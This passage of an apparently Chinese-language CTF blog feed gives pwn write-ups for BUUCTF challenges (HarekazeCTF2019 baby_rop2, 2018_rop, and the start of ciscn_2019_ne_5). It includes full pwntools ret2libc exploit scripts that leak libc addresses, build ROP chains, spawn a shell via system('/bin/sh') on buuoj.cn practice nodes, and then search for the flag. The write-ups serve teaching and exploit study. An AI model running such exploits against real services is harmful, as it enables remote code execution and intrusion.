class="hljs-attribute">str_bin_sh</span>=libcbase+libc.dump(&quot;str_bin_sh&quot;)<br><span class="hljs-attribute">payload2</span>=b&quot;A&quot;*(0x28)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system)+p64(ret)<br>p.recvuntil(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/images/pwn6-2.png"></p><p>跑这个脚本之前试过很多次都出现了“timeout: the monitored command dumped core”这个报错。原因是在选择libc版本时可以看到给了很多选项，我看都没看就选了第0个，怎么也打不通，后来换了第3个,问题解决</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Multi</span> Results:<br> <span class="hljs-attribute">0</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">1</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2_i386)<br> <span class="hljs-attribute">2</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">3</span>: ubuntu-xenial-amd64-libc6 (id libc6_2.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu10_amd64)<br> <span class="hljs-attribute">4</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu1_i386)<br></code></pre></td></tr></table></figure><h2 id="例题3-https-buuoj-cn-challenges-HarekazeCTF2019-baby-rop2"><a href="#例题3-https-buuoj-cn-challenges-HarekazeCTF2019-baby-rop2" class="headerlink" title="例题3 https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2"></a>例题3 <a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p> 例行检查，64位，开启了nx保护。</p><p> 运行程序有两个输入点。</p><p> 拖到ida看看，<br> main函数：</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">28</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>);<br>  v5 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  buf[v5 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>buf存在栈溢出。没有可以利用的后门函数，思路还是利用read函数泄露libc地址，然后获取system和binsh的地址。<br>这道题具体用printf函数输出read函数的地址。<br>但是这里我想补充一点，因为之前做此类题目时并没有很好的理解plt got表它们的作用是什么，只是按部就班的泄露。</p><p><strong>plt和got表</strong></p><p>例如像 call scanf 这样一条指令，它的具体过程大概是：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">call <span class="hljs-keyword">scanf </span>—&gt; <span class="hljs-keyword">scanf的plt表 </span>—&gt;<span class="hljs-keyword">scanf的got表</span><br></code></pre></td></tr></table></figure><p> 结合这张图可以更好地理解：</p><p> <img src="/images/pwn10-1.png"></p><p>简单来说，程序能够通过plt表找到got表中函数的地址，从而执行函数的功能。</p><hr><p>理解了这一点，再回到这一道题，能更好的理解利用printf函数泄露read函数的真实地址，并且在之后构建payload时也能更加清晰。</p><h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>泄露libc地址</li></ul><p>这道题利用printf函数，先贴上原型：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span>* format , [argument] ... )</span></span>;<br></code></pre></td></tr></table></figure><p>有两个参数，一个是带有类似于%s这种格式的字符串，另一个就是要输出的参数。</p><ol><li>第一个参数直接在源程序中找了，这里就有一个。</li></ol><p> <img src="/images/pwn10-2.png"></p><p>str_addr&#x3D;0x0000000000400770</p><ol start="2"><li><p>第二个参数就是需要输出的read函数地址。</p></li><li><p>使用ROPgadget查找rdi、rsi寄存器地址来传递参数。<br>这里查找的时候只有</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ ROPgadget --binary babyrop2 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;rsi&#x27;</span> <br><span class="hljs-number">0</span>x0000000000400731 : <span class="hljs-keyword">pop</span> rsi ; <span class="hljs-keyword">pop</span> r15 ; ret<br><br></code></pre></td></tr></table></figure><p>带着一个r15，我们用不到，所以一会直接把这个寄存器的参数设置成0好了。</p></li></ol><p>这一步骤的payload：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali">payload=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(str_addr)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(print_plt)+p64(main)<br><br>解释一下，‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>p64(pop_rdi)+p64(str_addr)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’<br>接收输出的read函数地址<br></code></pre></td></tr></table></figure><p>接收地址的指令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">read_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>看其他人解释为：接收地址基本上都是7个字节的，7f开头，补全8个字节<br>就当补充个常识吧。。</p><ul><li>根据基址计算system binsh的地址，执行system</li></ul><p>后面还是熟悉的流程，直接看完整exp吧。</p><h3 id="完整exp：-2"><a href="#完整exp：-2" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,26496)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./babyrop2&quot;)<br><br><span class="hljs-attribute">print_plt</span>=elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br><span class="hljs-attribute">read_got</span>=elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br><span class="hljs-attribute">main</span>=0x0000000000400636<br><span class="hljs-attribute">poprdi</span>=0x0000000000400733<br><span class="hljs-attribute">poprsi</span>=0x0000000000400731<br><span class="hljs-attribute">str_addr</span>=0x0000000000400770<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(read_got)+p64(poprsi)+p64(read_got)+p64(0)+p64(print_plt)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br><br>r.sendline(payload)<br>read_addr = u64(r.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#puts_addr=u64(r.recv(8))</span><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;read&quot;,read_addr)<br><span class="hljs-attribute">libcbase</span>=read_addr-libc.dump(&quot;read&quot;)<br><span class="hljs-attribute">system</span>=libcbase+libc.dump(&quot;system&quot;)<br><span class="hljs-attribute">binsh</span>=libcbase+libc.dump(&quot;str_bin_sh&quot;)<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(binsh)+p64(system)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br>r.sendline(payload)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>但是！！明明脚本没什么问题，又遇到了之前的错误timeout: the monitored command dumped core<br>这次更换libc版本也不行，百思不得其解。。。<br>这个问题如果后续解决了再补充。。。</p><hr><p><strong>问题解决：</strong></p><p>这个问题拖了好几天，又尝试了很多大佬的wp，终于解决了。。。</p><p>上面这种exp是通过LibcSearcher库搜索的read、system地址，没有用到题目给的libc文件，应该是因为这个导致没打通。换成用libc.so.6文件搜索地址：</p><h3 id="完整exp（修改版）"><a href="#完整exp（修改版）" class="headerlink" title="完整exp（修改版）"></a>完整exp（修改版）</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,27426)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./babyrop2&quot;)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-attribute">print_plt</span>=elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br><span class="hljs-attribute">read_got</span>=elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br><span class="hljs-attribute">main</span>=0x0000000000400636<br><span class="hljs-attribute">poprdi</span>=0x0000000000400733<br><span class="hljs-attribute">poprsi</span>=0x0000000000400731<br><span class="hljs-attribute">str_addr</span>=0x0000000000400770<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(read_got)+p64(print_plt)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br><br>r.sendline(payload)<br><br>r.recvuntil(<span class="hljs-string">&quot;!\n&quot;</span>)<br><br>read_addr = u64(r.recv(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#puts_addr=u64(r.recv(8))</span><br><br><span class="hljs-attribute">libc_read</span>=libc.symbols[<span class="hljs-string">&quot;read&quot;</span>]<br><span class="hljs-attribute">libcbase</span>=read_addr-libc_read<br><span class="hljs-attribute">system</span>=libcbase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br><span class="hljs-attribute">binsh</span>=libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(binsh)+p64(system)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br>r.sendline(payload)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>改动了如下几个地方：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span>=b<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0</span>x20+<span class="hljs-number">8</span>)+p64(poprdi)+p64(read_got)+p64(print_plt)+p64(main)<br><span class="hljs-comment">#这里发现不用rsi寄存器，直接跟上printf的plt地址也能打通，当然原先那种方法也行</span><br><br><span class="hljs-attr">read_addr</span> = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#事实证明这种写法也能打通</span><br><br><span class="hljs-attr">libc_read</span>=libc.symbols[<span class="hljs-string">&quot;read&quot;</span>]<br><span class="hljs-attr">libcbase</span>=read_addr-libc_read<br><span class="hljs-attr">system</span>=libcbase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br><span class="hljs-attr">binsh</span>=libcbase+next(libc.search(b<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><span class="hljs-comment">#不用LibcSearcher搜索，改成这种做法，注意binsh搜索时的写法</span><br></code></pre></td></tr></table></figure><p>修改后获取shell了，却发现没有flag文件，因此要用如下命令查找flag文件：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>得到flag。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> ret2libc：</p><ul><li>根据puts、write等函数泄露libc地址，注意32&#x2F;64位的区别（64位堆栈平衡问题、接收地址时是u32还是u64，接受的位数），以及write函数设置参数的问题。</li><li>计算偏移、system、binsh的地址</li><li>执行system（32&#x2F;64参数顺序问题）</li><li>ps.脚本和源程序放在LibcSearcher目录下哦</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ROP初尝试</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-2018-rop）"><a href="#例题（BUUCTF-2018-rop）" class="headerlink" title="例题（BUUCTF 2018_rop）"></a>例题（BUUCTF 2018_rop）</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/pwn4-1.png"></p><p>32位，开启了NX保护.</p><p>用ida看一下，主要函数就两个。<br><img src="/images/pwn4-2.png"></p><p><strong>main():</strong></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">int</span> <span class="hljs-function">__cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  be_nice_to_people();<br>  vulnerable_function();<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">0xD</span>u)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>vulnerable_function():</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">vulnerable_function</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[136]</span>; <span class="hljs-comment">// [esp+10h] [ebp-88h] BYREF</span><br><br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>&#125;<br></code></pre></td></tr></table></figure><p>buf很明显存在栈溢出，没有system 、&#x2F;bin&#x2F;sh,也没有其他信息了，是泄露libc类型的题目。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>利用write函数来泄露程序的libc版本</li><li>知道libc版本后去计算程序里的system函数和字符串“&#x2F;bin&#x2F;sh”的地址</li><li>覆盖返回地址为system（‘&#x2F;bin&#x2F;sh’），获取shell</li></ul><p><strong>1.泄露程序的libc版本：</strong></p><p>write函数说明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span>*buf,<span class="hljs-type">size_t</span> count)</span></span>;<br></code></pre></td></tr></table></figure><p>fd:是文件描述符（write所对应的是写，即就是1）<br>buf:通常是一个字符串，需要写入的字符串<br>count：是每次写入的字节数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span>x88+<span class="hljs-number">4</span>)+<span class="hljs-built_in">p32</span>(write_plt)+<span class="hljs-built_in">p32</span>(main)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p32</span>(write_got)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">4</span>)<br>r<span class="hljs-selector-class">.sendline</span>(payload)<br>write_addr=<span class="hljs-built_in">u32</span>(r<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">4</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br></code></pre></td></tr></table></figure><p>首先填充造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）<br>p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位</p><p><strong>2.算出程序的偏移量，计算system和bin&#x2F;sh的地址</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">offset</span>=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)     <span class="hljs-comment">#计算偏移量</span><br>                                <span class="hljs-comment">#偏移量=程序里的函数地址-libc里的函数地址</span><br><span class="hljs-attr">system_addr</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-attr">bin_sh</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>3.构造rop获取shell</strong></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload=&#x27;a&#x27;*(<span class="hljs-number">0</span>x88+4)+p32(<span class="hljs-name">system_addr</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">bin_sh</span>)<br></code></pre></td></tr></table></figure><h3 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node3.buuoj.cn&#x27;,27043)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./2018_rop&#x27;)<br><br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)<br>r.sendline(payload)<br><span class="hljs-attribute">write_addr</span>=u32(r.recv(4))<br><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">offset</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><br><span class="hljs-attribute">system_addr</span>=offset+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bin_sh</span>=offset+libc.dump(&#x27;str_bin_sh&#x27;)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>这里一开始会报错，报错内容大概是LibcSearcher不能用，但是我确实安装了这个包，后来发现是因为没有将二进制程序和脚本放到LibcSearcher目录下。</p><p>放到同一目录下之后，再运行脚本：</p><p><img src="/images/pwn4-3.png"></p><p>匹配到了多个libc版本，选第一个，之后就可以查看flag了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn练习——32位栈溢出</title>
    <link href="/2023/09/18/Pwn%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%9432%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/09/18/Pwn%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%9432%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-ciscn-2019-ne-5）"><a href="#例题（BUUCTF-ciscn-2019-ne-5）" class="headerlink" title="例题（BUUCTF ciscn_2019_ne_5）"></a>例题（BUUCTF ciscn_2019_ne_5）</h2><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p><img src="/images/pwn3-4.png"></p><p>开启了nx保护。</p><p>运行程序试一试：</p><p><img src="/images/pwn3-1.png"></p><p>要求输入密码，从ida中看到密码为“administrator”，输入后看到几个选项，</p><p><img src="/images/pwn3-2.png"></p><p>下面依次看一下几个主要函数。</p><p><strong>main函数：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+0h] [ebp-100h] BYREF</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+4h] [ebp-FCh] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">124</span>]; <span class="hljs-comment">// [esp+8h] [ebp-F8h] BYREF</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+84h] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">char</span> v8[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+88h] [ebp-78h] BYREF</span><br>  <span class="hljs-type">int</span> *v9; <span class="hljs-comment">// [esp+F4h] [ebp-Ch]</span><br><br>  v9 = &amp;argc;<br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  *(_DWORD *)s1 = <span class="hljs-number">48</span>;<br>  <span 